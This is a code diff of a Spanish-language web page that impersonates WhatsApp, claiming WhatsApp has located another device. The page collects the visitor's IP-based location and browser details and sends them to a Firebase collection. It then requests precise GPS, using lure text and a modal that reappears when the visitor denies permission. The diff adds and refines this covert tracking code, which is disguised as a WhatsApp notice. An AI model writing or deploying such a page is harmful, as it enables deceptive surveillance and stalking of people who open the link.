@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>WhatsApp</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>whatsApp</title>
     <style>
         .imagen-superior {
             display: block;
@@ -34,7 +34,7 @@
             height: 350px;
             border: none;
             border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, .25);
         }
         .modal {
             display: none;
@@ -43,7 +43,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, .6);
             justify-content: center;
             align-items: center;
             z-index: 9999;
@@ -54,7 +54,7 @@
             padding: 20px;
             border-radius: 15px;
             text-align: center;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, .3);
         }
         .modal-contenido h3 {
             color: #075E54;
@@ -71,29 +71,29 @@
             padding: 10px 20px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 14px;
             margin: 5px;
         }
         .modal-contenido button:hover {
             background: #1DA851;
         }
         #btnRecargar {
-            background-color: #075E54;
+            background: #075E54;
         }
         #btnRecargar:hover {
-            background-color: #054a42;
+            background: #054a42;
         }
     </style>
 </head>
 <body>
-    <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior" />
+
+    <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">
     <h2>WhatsApp obtuvo la ubicación ...</h2>
-    <p id="estado">Cargando datos de IP...</p>
+    <p id="estado">Modelo: iphone14 promax .</p>
     <iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>
 
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
-            <img src="imagenubicacion.jpg" class="imagen-superior" alt="Ubicación" />
+            <img src="imagenubicacion.jpg" class="imagen-superior" alt="Logo">
             <h3>Permiso de ubicación</h3>
             <p id="textoAlerta"></p>
             <button id="btnAceptar">Aceptar</button>
@@ -131,31 +131,32 @@
         const btnRecargar = document.getElementById("btnRecargar");
 
         let docId = null;
-        let datosIP = {};
-        let ubicacionObtenida = false;
-        let solicitudEnProgreso = false;
 
-        // Mostrar/ocultar modal
+        // ---------- FUNCIONES (sin cambios en la lógica original) ----------
         function mostrarAlerta(texto) {
             textoAlerta.textContent = texto;
             modal.style.display = "flex";
         }
 
-        function ocultarAlerta() {
+        function cerrarAlerta() {
             modal.style.display = "none";
+            // Reintentar ubicación después de 2 segundos (igual que en tu código original)
+            setTimeout(() => {
+                if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(
+                    () => { /* si funciona, no hacemos nada */ },
+                    () => {
+                        // si sigue fallando, mostrar de nuevo el modal
+                        modal.style.display = "flex";
+                    }
+                );
+            }, 2000);
         }
 
-        // Botón Aceptar: recarga la página (porque después de denegar, el navegador no volverá a preguntar)
-        btnAceptar.addEventListener("click", function () {
-            window.location.reload();
-        });
+        btnAceptar.addEventListener("click", cerrarAlerta);
+        btnRecargar.addEventListener("click", () => window.location.reload());
 
-        // Botón Recargar: igual
-        btnRecargar.addEventListener("click", function () {
-            window.location.reload();
-        });
-
-        // Obtener datos de IP
+        // ---------- NUEVO: Obtener IP al inicio ----------
         async function obtenerDatosIP() {
             try {
                 const respuesta = await fetch("https://ipapi.co/json/");
@@ -182,8 +183,8 @@
             }
         }
 
-        // Guardar documento inicial con IP y datos del navegador
-        async function guardarDatosIniciales() {
+        // ---------- NUEVO: Guardar IP y datos del navegador (sin GPS) ----------
+        async function guardarDatosIP(datosIP) {
             try {
                 const docRef = await addDoc(collection(db, "ubicaciones"), {
                     ...datosIP,
@@ -199,17 +200,17 @@
                     ubicacion_obtenida: false
                 });
                 docId = docRef.id;
-                console.log("Documento inicial creado ID:", docId);
-                estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
-                return true;
+                console.log("Documento inicial creado (IP):", docId);
+                estado.textContent = "✅ IP guardada. Solicitando ubicación...";
+                return docId;
             } catch (error) {
-                console.error("Error al guardar datos iniciales:", error);
-                estado.textContent = "⚠️ Error al guardar datos iniciales.";
-                return false;
+                console.error("Error guardando IP:", error);
+                estado.textContent = "⚠️ No se pudo guardar la IP.";
+                return null;
             }
         }
 
-        // Actualizar el documento con la ubicación GPS
+        // ---------- NUEVO: Actualizar el documento con GPS ----------
         async function actualizarConUbicacion(posicion) {
             if (!docId) return false;
             try {
@@ -220,82 +221,69 @@
                     ubicacion_obtenida: true,
                     fecha_ubicacion: serverTimestamp()
                 });
-                console.log("Ubicación actualizada en el documento");
                 return true;
             } catch (error) {
-                console.error("Error al actualizar con ubicación:", error);
+                console.error("Error actualizando con ubicación:", error);
                 return false;
             }
         }
 
-        // Solicitar ubicación GPS
-        function solicitarUbicacion() {
-            if (!navigator.geolocation) {
-                mostrarAlerta("Tu navegador no soporta geolocalización.");
-                return;
+        // ---------- FLUJO PRINCIPAL (tu lógica original + IP) ----------
+        (async function main() {
+            // 1. Obtener y guardar IP (sin esperar GPS)
+            estado.textContent = "🌐 Obteniendo IP...";
+            const datosIP = await obtenerDatosIP();
+            const id = await guardarDatosIP(datosIP);
+            if (!id) {
+                estado.textContent = "⚠️ Error al guardar IP. Continuamos sin IP.";
             }
-            if (solicitudEnProgreso || ubicacionObtenida) return;
-            solicitudEnProgreso = true;
-            estado.textContent = "📍 Solicitando permiso de ubicación...";
 
-            navigator.geolocation.getCurrentPosition(
-                async (posicion) => {
-                    solicitudEnProgreso = false;
-                    ubicacionObtenida = true;
-                    estado.textContent = "📍 Ubicación obtenida, actualizando...";
-                    const actualizado = await actualizarConUbicacion(posicion);
-                    if (actualizado) {
-                        estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
-                        ocultarAlerta();
+            // 2. Tu lógica original de geolocalización
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async function(posicion) {
                         const lat = posicion.coords.latitude;
                         const lon = posicion.coords.longitude;
-                        setTimeout(() => {
-                            window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
-                        }, 2500);
-                    } else {
-                        estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
-                        mostrarAlerta("Error al guardar la ubicación. Intenta de nuevo.");
-                    }
-                },
-                (error) => {
-                    solicitudEnProgreso = false;
-                    console.log("Código de error de geolocalización:", error.code);
-                    let mensaje = "";
-                    switch (error.code) {
-                        case error.PERMISSION_DENIED:
-                            mensaje = "Permiso de ubicación denegado. Activa la ubicación en los ajustes del navegador y recarga la página.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            mensaje = "No fue posible obtener la ubicación. Asegúrate de que el GPS esté activo.";
-                            break;
-                        case error.TIMEOUT:
-                            mensaje = "La solicitud de ubicación tardó demasiado. Intenta de nuevo.";
-                            break;
-                        default:
-                            mensaje = "Ocurrió un error desconocido (" + error.code + ").";
-                    }
-                    if (!ubicacionObtenida) {
+                        estado.textContent = "📍 Ubicación obtenida, guardando...";
+
+                        // Actualizar el documento con GPS
+                        const actualizado = await actualizarConUbicacion(posicion);
+                        if (actualizado) {
+                            estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
+                            setTimeout(function() {
+                                window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
+                            }, 2500);
+                        } else {
+                            estado.textContent = "⚠️ No se pudo guardar la ubicación.";
+                        }
+                    },
+                    function(error) {
+                        let mensaje = "";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                mensaje = "Activa la ubicación para ver otro dispositivo.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                mensaje = "No fue posible obtener la ubicación.";
+                                break;
+                            case error.TIMEOUT:
+                                mensaje = "La solicitud tardó demasiado.";
+                                break;
+                            default:
+                                mensaje = "Ocurrió un error desconocido.";
+                        }
                         mostrarAlerta(mensaje);
+                        estado.textContent = "⚠️ " + mensaje;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
-                    estado.textContent = "⚠️ " + mensaje;
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }
-
-        // FLUJO PRINCIPAL
-        (async function main() {
-            estado.textContent = "🌐 Obteniendo datos de IP...";
-            datosIP = await obtenerDatosIP();
-
-            const guardado = await guardarDatosIniciales();
-            if (!guardado) {
-                estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
-                return;
+                );
+            } else {
+                mostrarAlerta("Tu navegador no soporta geolocalización.");
             }
-
-            // Intentar obtener la ubicación directamente (sin verificar permisos)
-            solicitarUbicacion();
         })();
     </script>
 </body>
